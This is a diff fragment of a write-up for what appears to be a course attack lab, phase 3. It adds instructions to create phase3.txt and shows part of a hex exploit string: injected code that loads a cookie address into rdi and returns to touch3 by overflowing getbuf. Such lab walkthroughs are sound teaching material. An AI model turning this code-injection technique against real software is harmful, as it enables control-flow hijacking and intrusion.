@@ -37,7 +37,7 @@ Disassembly of section .text:
    c:	c3                   	retq   
 ```
 
-Now, grab the bytes from the above code and start constructing your exploit string.
+Now, grab the bytes from the above code and start constructing your exploit string. Create a new file named phase3.txt and here is what mine looks like:
 ```
 48 c7 c7 58 38 62 55 68
 60 18 40 00 c3 00 00 00 /* mov return address of getbuf to rdi register and push address of touch3 to the stack */
